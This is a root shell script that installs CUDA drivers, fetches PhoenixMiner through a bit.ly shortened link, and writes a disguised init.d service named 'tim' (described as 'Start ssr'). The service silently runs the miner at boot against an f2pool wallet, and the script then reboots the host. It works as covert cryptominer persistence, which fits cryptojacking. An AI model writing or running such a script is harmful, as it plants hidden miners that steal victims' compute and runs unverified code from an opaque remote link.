#!/bin/sh
wget -O /tmp/cuda-repo-ubuntu1804_10.2.89-1_amd64.deb https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-repo-ubuntu1804_10.2.89-1_amd64.deb
dpkg -i /tmp/cuda-repo-ubuntu1804_10.2.89-1_amd64.deb
apt-key adv --fetch-keys http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub
rm -f /tmp/cuda-repo-ubuntu1804_10.2.89-1_amd64.deb
apt-get update -y
apt-get install cuda-drivers -y
apt-get install unzip -y


wget -O PhoenixMiner.zip https://bit.ly/3bujasD
unzip PhoenixMiner.zip
cd PhoenixMiner_5.5c_Linux
chmod +x PhoenixMiner

echo '#!/bin/bash' > /etc/init.d/tim
echo '### BEGIN INIT INFO' >> /etc/init.d/tim
echo '# Provides:    tim' >> /etc/init.d/tim
echo '# Required-Start:    $network $local_fs $remote_fs' >> /etc/init.d/tim
echo '# Required-Stop:     $network $local_fs $remote_fs' >> /etc/init.d/tim
echo '# Default-Start:     2 3 4 5' >> /etc/init.d/tim
echo '# Default-Stop:      0 1 6' >> /etc/init.d/tim
echo '# Short-Description: The server with automatic' >> /etc/init.d/tim
echo '# Description:       Start ssr' >> /etc/init.d/tim
echo '### END INIT INFO' >> /etc/init.d/tim
echo 'nohup /root/PhoenixMiner_5.5c_Linux/PhoenixMiner -epool eth.f2pool.com:6688 -ewal 0x2986D651E9031F3FC325653913fa98491e0F06c7 -worker t1 -pass x 2>&1 &' >> /etc/init.d/tim

chmod +x /etc/init.d/tim
update-rc.d tim defaults

printf " System is going into reboot\n\n"
reboot
